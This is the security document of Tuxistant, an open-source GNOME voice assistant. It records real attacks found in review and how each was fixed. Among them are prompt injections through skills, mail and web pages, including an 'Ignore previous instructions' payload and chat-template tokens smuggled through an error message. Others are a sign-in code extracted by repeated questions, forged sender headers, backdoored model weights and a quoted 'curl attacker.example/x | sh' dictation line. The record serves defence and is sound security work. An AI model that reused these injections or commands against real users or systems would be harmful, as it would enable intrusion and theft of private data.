# Security

Tuxistant can read your files, run commands and type into your windows, so it gets attacked before it ships. Reviews try to break each feature, what they find is reproduced, and each attack that matters stays in the test suite.

These are real attacks from building it. What is still open is listed under "Known limits" in [ROADMAP.md](ROADMAP.md).

## Reporting a problem

Please [report it privately](https://github.com/BuenGenio/Tuxistant/security/advisories/new) rather than in a public issue.

## How it is meant to hold

- A risky action needs a click on a card. A voice "yes" never counts, because audio playing nearby could say it.
- The text on a card comes from the daemon looking at the real action, never from a model or a skill.
- After private data has been read, nothing leaves your own server without a click.
- The model can be made to emit any tool call, so the parser, the sandbox and the card have to hold on their own.

## Community skills

There is no registry yet, so nobody can share a skill through Tuxistant. But a skill you add with code of its own now runs: copy a folder into `~/.local/share/tuxistant/skills/` and it loads while Tux is running. The plan assumes a bad skill will eventually get past review, so permissions and the sandbox have to be what protects you. The [README](../README.md#skills-and-security) shows which protections are built and which are planned, and [SKILLS.md](SKILLS.md#code-skills) has the details.

What holds a code skill today:

- **The sandbox.** Bubblewrap, shellgate's seccomp filter and its memory limit. No home folder, session bus, runtime folder or display. It runs from a copy of its folder made when it was checked, so code that was never checked can't start under an older manifest.
- **Only the network.** A skill you add may ask for nothing but the network. The network is shared with this computer, so it reaches the internet and your local network, and the card says so. Landlock keeps it away from this computer's own services: no abstract sockets from outside the sandbox, TCP only to ports 53, 80 and 443, and no listening. UDP, and TCP on those three ports, are not held back.
- **No secrets.** The one secret a skill can be given is the TP-Link login, and only the Lights that come with Tuxistant get it.
- **No quiet upgrades.** What a skill was first allowed is noted. A new version that asks for more isn't used until you take the skill out and put it back, and then what it saved is cleared.
- **Short, plain text.** Action descriptions, parameters and answers are cut short and their hidden characters shown, before the model or the history sees them. A name, description, version or parameter text with `<` or `>` is refused, and an answer loses them, so neither can carry chat-template delimiters such as `<|im_start|>` or `<tool_call>`. What a skill answers is still a stranger's text: it can make Tux say something false, but whatever the model does next meets the same gates.

What doesn't hold yet: a skill can start as many processes as your account may, and keep a CPU core busy while it runs.

## A hostile model

Unlike the attacks below, this one hasn't been tried: no backdoored model or hostile model file has been run against Tuxistant.

A model you download can be malicious in two ways:

- **The file attacks the server that loads it.** PyTorch pickle files can run code when loaded, and `trust_remote_code` runs Python that comes with the model. A GGUF file carries no code, but a chat template in its metadata still gave code execution in llama-cpp-python ([CVE-2024-34359](https://github.com/advisories/GHSA-56xg-wfcc-g829)).
- **The weights are trained to misbehave.** A model can act normally until it sees a trigger. Nobody can reliably find this by inspecting the weights, and tests won't catch it because they never say the trigger.

Hostile weights get no more power than a prompt injection. The design already assumes the model can emit any tool call, so the call still has to get past the parser, the sandbox and the card, and the model doesn't write the card's text.

These parts aren't protected:

- **Your server.** Tuxistant can't tell which model your server is running or whether its files have been changed. Code running there is beyond the reach of the cards. It can keep your speech, your transcripts and anything a conversation has read, including what no-click reads return, and it can send any tool call it likes.
- **Your judgement.** The card stays accurate, but the model can still tell you to approve it.
- **Plain answers.** A model can lie to you, and no card stops that.

If you run your own server, Tuxistant can't enforce these, so they are up to you:

- Use GGUF or safetensors files, never pickle, and leave `trust_remote_code` off.
- Pin each model to a file hash rather than a name.
- Keep your server's backends patched, and read the chat template of any new GGUF.

A community skill must never be able to choose or download a model, because that would step around all of this.

## Opening apps

Tux can open an installed app or a page of GNOME Settings. Nothing has attacked this yet, so this is the threat model it was built to, not a record of attacks.

The model can be made to emit any tool call, so it is assumed to ask for anything. It only ever names an app. The name is matched on this computer against Gio's list of installed apps, and only the desktop file that matched is started, with `gio launch`. No file, address, desktop action or argument goes with it, so nothing the model writes reaches a command line.

- **An invented name.** A name that matches nothing gets "I can't find an app called ...". A near miss can open the wrong app, which is a window you close.
- **A conversation that has read a web page or a mail.** It may have been talked into opening something, but opening sends nothing out, and which app was opened can't carry anything private, so the rule that nothing leaves the house after private data is untouched. Apps installed as packages and Settings pages still open with no card.
- **A terminal.** It is dangerous only through what is typed into it. Tux can't type into it: dictation starts only on your own key press, and no tool can start it. So a terminal opens with no card. An app that needs root brings its own password prompt.
- **An entry that does something as soon as it starts.** A desktop file in your home folder can run any command, and is often a script, a sync or a game that acts straight away. Tux can't prove that harmless, which is the shell's rule, and its name may have been written by a web page. So an entry whose real file is outside the system folders, the Flatpak app folders and Snap shows a card with the command it runs and the file it comes from. The card is built from the same bytes whose digest is checked after the click, so the command shown is the one checked. An entry whose command holds a field code other than `%f`, `%F`, `%u`, `%U` and `%%` is left alone with no card, as `gio launch` fills some of them in after the click, such as `%i`, `%c` and `%k` with the entry's icon, name and file, and the card couldn't show what runs. It also says when the entry may start over D-Bus, where the command is not what runs and a service file in your home folder can hold anything, and when it runs in a terminal or in another folder.
- **A shadow.** A file in your home folder with the same id as a packaged app or a Settings page is what Gio would run, so it is judged as a home folder entry and gets the card.
- **The file changing while the card is up.** It is read again after the click, and if it is not the same, Tux leaves it alone.
- **A name written to be read out.** App names can come from a web page, so a reply naming an app is said by the app and never returned to the model, with angle brackets removed and hidden characters shown as escapes.

What doesn't hold:

- A packaged app that does something as soon as it starts opens with no card, even after web text.
- A remote-desktop app can be opened with no card.
- The file is checked after the click, but `gio launch` reads it a moment later, so a process already running as you could swap it in between.
- When the entry may start over D-Bus, the card says so, but the D-Bus service file that then runs is neither shown nor checked.
- A packaged app is judged only by where its desktop file is. So a program that can already write to your home folder can still run code with no card: through a D-Bus service file in your home folder with the id of a packaged app that starts over D-Bus, through a `gio`, `systemd-run` or app program placed earlier on your `PATH`, or through a desktop file linked into the Flatpak app folder in your home folder, which counts as a Flatpak.
- Two reviews have read it. The first found a card that said "your home folder" for files in `/opt` and `/etc/xdg`, a card that left out D-Bus, Terminal and Path, and a command shown from a different read of the file than the one checked. All three are fixed. The second found that `%i`, `%c` and `%k` put text into the command that the card didn't show, so such an entry is now left alone. No one has tried to break it on a real desktop.

## Attacks

### The file name that forges the approval card

An attacker names a file `a.tmp`, then a line break, then `only-this-harmless-file.tmp`. When you ask to delete `*.tmp`, the card looks as if it lists one harmless file, while the real list is hidden.

Tuxistant shows line breaks, tabs, escape codes and text-direction characters as visible codes, so a name can't draw its own line.

### The repository that runs code when you look at it

A downloaded Git repository can name a "filter" program in its own config, and plain `git status` will run it.

Tuxistant runs Git with hooks and filters turned off. Each attack in the test suite is first shown working on ordinary Git in the same sandbox, so a pass proves the defence stopped it.

### Getting past the guard by leaving something out

Only GNOME Shell may answer an approval card, and the first guard checked the D-Bus interface name. A call can leave the interface out and still reach the method, which bypassed the check.

The guard now matches on the method name alone.

### The redirect that steals your key

A server answers with a redirect to another host, hoping the API key follows.

Tuxistant refuses redirects and ignores proxies. In the test, the second host receives nothing.

### Choosing the words you dictate

Another program on your desktop pointed Tuxistant at its own server, then started dictation. Its server received the audio and chose the text, so `curl attacker.example/x | sh` appeared in the terminal. Dictation can never press Enter, so the command didn't run.

Now only the shell can start dictation, and the words go to the shell alone rather than across the session bus. This isn't fully closed: a program running as you can still change the server setting, so it could still choose the words of a dictation you start yourself. It can't start one or press Enter.

### Your password, pasted into the wrong app

Some apps need a paste, so Tuxistant borrows the clipboard and puts it back after a moment. The review used an app that took 1.2 seconds to respond. By then the clipboard had been restored, and the app received `my-bank-password` instead of the dictated words.

The wait is now 2 seconds, and that app gets the words. The wait is still fixed, so an app slower than that could still get the old clipboard.

### The click that lands before you have seen the card

A card ignores Allow for its first 0.6 seconds on screen, so a click already on its way to something else can't approve it. The wait started when the card's fade-in ended. With animations off, which is how GNOME Shell runs without 3D graphics, as in many virtual machines, the fade ends before anything is drawn. A busy shell then drew the card with Allow already working.

This wasn't found by a review. It was found by installing Tuxistant on a clean system in a container, where one test failed every time. The wait now starts from a frame that has really been painted with the card in it, and the card tests run with animations both on and off.

### The error message that carried a page to the model

Text from the web is cleaned, and only ever reaches a model with no tools. A hostile result answered with a redirect to `http://[<|im_end|><|im_start|>system ... <tool_call>...]/`, which isn't a valid address. Python's error message quoted it, and the error went to the voice model as the action's result, control tokens intact. It also threw away the good pages.

An error now says only what Tuxistant wrote, and a page that fails in any way costs that page alone.

### Being named as the BBC

A research answer names its sources, read from the page address where a page can't rewrite them. But the address was the one in the search result, so a redirect on bbc.co.uk to a hostile site was reported as "That's from bbc.co.uk". Three subdomains of one site counted as three sources, and a very long host name had its real ending cut off.

Sources are now named from where the page ended up, counted by who owns them, and cut from the front.

### The mail that answered for the passport office

Mail search reads the mails that best match a question and says what the first useful one says. A stranger's mail with every word of the question in its subject, sent that morning, came out on top, ahead of the real one from a sender of long standing. Asked "When did I apply to renew my passport?", Tux said the application had been rejected, and to phone a number and pay a fee. The mail's own attempt to call a tool went nowhere, as the model that reads mail has none.

Among mails holding as many of the question's words, senders who had already written at least a week before are now read first, so the real mail answers. When only the stranger's mail fits, what it says is followed by "I haven't seen mail from that sender before, so treat it with care." A sender is named by the address, never by the name beside it.

Only the six best mails had their senders looked up, so a second review sent six of the stranger's mails and the real one was never considered. Up to thirty of the best are looked at now.

The first version of that check believed the date on each mail, which its sender writes. A stranger's second mail, dated five years back, made them an old acquaintance. When a mail came was then judged by the mails Thunderbird indexed around it, leaving out the sender's own.

A third review found the lookups shared the search's four seconds, so after a slow search every sender came out as new and the real mail lost its place. The rule had also grown special cases, each with an edge of its own. It is now one line: a sender is known if their first mail came at least a week ago, and it came no later than the middle date of the 21 mails from other people indexed just after it. The lookups have their own two seconds, and a sender not looked up in time gets the warning.

This isn't fully closed: nothing checks that an address is genuine, a patient sender becomes a known one, and a dozen forged mails from different addresses, sent straight after the first, could still shift the date.

### The trusted address typed into the name

A sender is named by address, never by the name beside it, because the name is whatever the sender typed. A review typed an address there: `"no-reply@notify.passports.example" <help@evil.example>`. The code took the first address it saw, so the stranger's mail was said to be from the passport office, with its years of history and no warning.

The first fix read the sender line with the standard library's parser, and a second review bent the line further. A second address the parser couldn't read left the trusted one standing alone. A line of five hundred nested brackets ran the parser out of stack, and every search that passed that mail failed.

The line is no longer parsed as mail at all. The address is what stands in the one pair of angle brackets at its end, or the whole line if it is nothing but an address. Anything else is "an unknown sender", and gets the warning. History is kept by the exact address, as a domain is shared by every customer of a help desk and every user of a mailbox provider.

### The mail that borrowed an ID

A mail filed in two folders was known as one mail by its Message-ID, and was the user's own if either copy was in Sent. A Message-ID is whatever a sender writes, and anyone the user ever wrote to has the ID of that mail. A stranger's mail sent under it was read out as "an email you sent", with no warning, and the real one was dropped as its copy. The same trick under a known sender's ID took that mail's place.

The ID is no longer looked at. One mail is one sender, subject and text, so the only mail that can pass for one the user sent is that mail, word for word.

### Twenty questions for a sign-in code

Mails with sign-in codes are never read. But when one was the only match, the reply was "the only mail I found holds sign-in codes", and otherwise "I couldn't find any mail about that". A model that has been turned can ask anything, so the review asked for "expires 48", then "expires 482", and had the code 482913 after 139 questions, without one mail being read.

A sign-in mail now leaves no trace: it takes no place in a search, and the reply is the same as if it weren't there. The same review found most real sign-in mails weren't recognised, such as "your one-time password is", a code written "482 913", and every one not in English.

Widened, the list then held back ordinary mail: a hotel booking for its confirmation code, an order for its promo code, a receipt for a one-time payment. The user was told there was no such mail. And it still missed "your password for the portal is", and a code in a mail that a footer made long. A narrower list, looking for the secret itself, came out of a third review the same way: some real sign-in mail read out, and some ordinary mail still held back.

Holding back the whole mail was the wrong tool, as every miss was total either way. The mail is now read and the secret hidden: what stands where a code or a password would is replaced before the mail is searched, so the twenty questions find nothing, and before a model sees it, so there is nothing to say. Hiding can afford to be greedy, as too much costs a number in an answer and not the answer. It is still a list of words and shapes, and docs/ROADMAP.md says what gets past it.

### The answer nobody wrote

For research, facts and mail, the voice model is told only that it's done, and the app reads the answer out. Asked to speak after that, with the question in front of it and no answer, the model made one up: a date, in 2 of 8 tries at one question, said just before the real one.

It is no longer asked to speak when the app has the answer. A review then found the same thing by another road. Through a multi-step task, the planning model saw "done", wrote an answer of its own, and the voice model was asked to say that. A step the app reads out now ends the task. The first fix had also dropped something: when the model answered an ordinary result with one of these tools, nobody ever said what the first result came to. That is still owed, and still asked for.

A third review found four more edges of the same rule. A model that said what it owed in the same reply as its call was asked to speak again, and with nothing left to say it made up an answer. A task ended at the first such call, so the rest of that reply never ran, and whatever earlier steps did went unsaid. And when the model's own reply failed, the answer the app already had was thrown away with it. Words beside a call now count as spoken, every call of a reply runs, the app says in its own words that the other steps are done or that some failed, and a waiting answer is read out before the error.

### The weather skill that could reach your phone

A review gave a skill the network and had it connect to listeners the test made on this computer: a TCP port on 127.0.0.1 and an abstract socket. Both answered. The same way, it could have reached adb on 127.0.0.1:5037, which controls a connected phone, CUPS, and the display's own sockets, as the network permission shared this computer's network.

Tuxistant now sets up Landlock inside the sandbox before the skill's code runs. The same probe gets "permission denied" for both.

### The skill that asked for your TP-Link password

Any skill you added could list `tapo_email` and `tapo_password` in its manifest and be handed them when it started, with nothing shown. Now only the Lights that come with Tuxistant may have them, and a skill you add that asks is refused with a reason.

### The update that turned a harmless skill into one with the network

A first version with no permissions loaded. A second, copied over it, asked for the network and the TP-Link password, and was used straight away. It kept the first version's saved data, so something read in one conversation could be sent out in a later one with no card. Now a version that asks for more is refused until you take the skill out and put it back, and its saved data is then cleared.

### The answer that filled the model's memory

A skill answered with 900,000 characters, starting with a text-direction override, an escape code and "Ignore previous instructions". It all reached the model and the history. Answers are now cleaned and cut: anything over 3,900 characters becomes an error, as a 4B model can't take more.

### The broken update whose code ran anyway

When a skill's new `skill.yaml` was broken, Tux said the last version that worked was still in use. It kept the old manifest, but the sandbox showed the live folder, so the next restart ran the new, unchecked code. Skills now run from a copy made when they were checked.

### The switch that opens the garage

A Home Assistant switch can be a garage door's relay, and a helper an alarm's arming flag. Both were switched with no card. One whose name or id says alarm, siren, lock, security, arm, disarm or deadbolt, joined spellings such as Doorlock included, or garage, door or gate, now shows a card, which the daemon writes from the entity and the service. The name and the id are judged apart, so renaming a rewired `switch.porch_light` to "Garage door" still counts. A name is judged both as the card shows it, cut to 40 characters, and up to 255 characters, and either one asking is enough, so "Shelly relay channel one outside wall garage door" counts too, and a light named only past the cut does not lift the card. A garage, door or gate that is also called a light, lamp, bulb, heater or fan does not, so a relay named "Garage light" runs with no card even if it is wired to the garage door. One named for something else, such as "Relay 2", still runs with no card.

Finding a thing by what was said used the name as cut for saying, so a word past the 40 characters found nothing and the words of "(9 more characters)" found it. It now uses the same 255 characters as the judging above, for area names too, and what is said and shown stays cut to 40. A word the cut at 255 splits is left out, so "garage do" is not a word of the name and the "fan" of "fancy" does not lift the card. Those 255 characters are never said. A name made from an entity id when there is none, which can be 255 characters, is cut to 40 as well, and an unknown kind of thing to 20, so every name and kind from the server is cut before the model sees it, as states and units already were.

### The front door asked of Wikipedia

The fact sorter wasn't told about music, timers or the home, so "Is the front door locked?" could be asked of Wikipedia with no click. A fixed word filter now sends those the normal way first, and the sorter's prompt names them.

The sorter's examples for them were first copied from the routing evaluation's own cases, so its leak count passed by construction. The examples are now new wordings, a test keeps them out of the evaluations, and the facts evaluation's never-seen set measures wordings nothing was tuned on.

The filter only stood in front of the sorter. On any turn the voice model answers (a turn from the shortcut, or a hold turn not sorted as a fact) it could pick `knowledge_answer` for "Is the front door locked?" itself, with no card, so the question still went to Wikipedia and web search. The tool now runs the same filter first and refuses, whatever turn it is called on. A private question worded so the filter misses it can still go there on those turns.

That refusal made the filter's misses costly the other way. It had been written for the sorter, where catching a fact costs little, and its bare words (our, my, thermostat, timer, countdown, how much longer, in the house) caught "How many planets are in our solar system?", "Who invented the thermostat?" and "Who sang My Way?". Those were then refused on every turn. These words now count only where they are about this home: "our" not before the solar system, the sun or the like, a capital My or Our after the first word as a title, and a thermostat, timer or countdown only with the words of a reading.

## Media, reminders and Home Assistant wiring

Browser media metadata can contain instructions written by a page. The media handlers now queue their replies for the app to speak and return only `APP_SAYS` to the model. This covers player names in errors as well as track titles and successful controls.

Home Assistant change results and failed matches can reveal device names and states, even when no change happens. Both handlers mark the conversation private after reading the device list, before returning or raising an error. Listing or cancelling reminders also marks stored times private, including reminders with no label.

The plain HTTP address check rejects IPv6 6to4 and Teredo addresses: Python can classify these as private even when they encode a public IPv4 destination. The token must not travel to those destinations in plaintext.

The timer scheduler waits for the startup lock check to finish. A five-second timeout previously let an overdue reminder speak before a slow screen shield had answered. Tests use a delayed stand-in shield and fake audio.

Each of these five guards has a regression test checked against a deliberately broken copy: the unbroken test passed first, then removing its guard made it fail. No real player, home device, notification or audio was used.

The follow-up review also found that an "alarm" request could match an alarm siren switch. Generic alarm control now refuses before matching devices. Device names lose angle brackets as well as escaping control characters, so they cannot carry chat-template delimiters.

The opt-in live protocol test now permits only the clock. The evaluations, the live test, the voice check and the demo video send the key only to a server named for the run, or to one saved in Settings that is neither the default nor on this computer. On this computer means a loopback address in any spelling, such as 127.1 or ::ffff:127.0.0.1, a localhost name, the machine's own name, or an address one of its network interfaces holds. Nothing is looked up, so another name that `/etc/hosts` gives this computer is not caught. A test fails if a tool reads the settings without that check straight after. Media cut-off tests pin the stand-ins themselves, not just the assignment names. These guards and the Home Assistant-only tool list were also checked by removing each fix in a throwaway copy; all six tests caught their mutation after first passing unbroken.

Cloud tasks now ask before forwarding Home Assistant or stored timer results, including errors that reveal names. Tests exercise all four actions against a fake cloud SDK and verify that declining sends only a withheld notice.

The lifecycle review found that a fast speech-server failure could discard the timer chime and mark unsaid words as done. The chime now drains on any speech failure. Words that fail before any is heard are tried three more times, a minute, two and four minutes apart, before the record says missed. Corrupt timer files with huge integers or deeply nested JSON are recovered without preventing startup. Failed lock queries keep speech locked and scheduler failures are logged. The lock check's setup is inside the same guard, so every way it fails leaves speech locked before the timers start. Five deliberate breaks of these fixes were caught; the deep-JSON fixture was increased until it exercised Python's recursion failure rather than merely parsing a nested list.

## When the checks themselves failed

### The test result that proved nothing

A check that breaks each safety guard on purpose reported 18 of 18 caught. Every test had actually died at import, so nothing had been tested.

The check now refuses to run unless the same tests pass with nothing broken first.

### The stand-in that was never used

A test of "what if pip isn't installed" put a fake pip in front of the real one. The fake was missing a file that makes Python treat a folder as a package, so the real pip ran instead, failed for another reason, and the test passed. It was found when the installer's message changed and the test didn't notice.

### The fix that crashed the desktop

Fixing a clipboard bug introduced a worse one: code held on to memory it didn't own, and GNOME Shell crashed. On Wayland that ends your whole session.

It was caught in an isolated test shell, and the rule is now in [CONTRACT.md](CONTRACT.md).
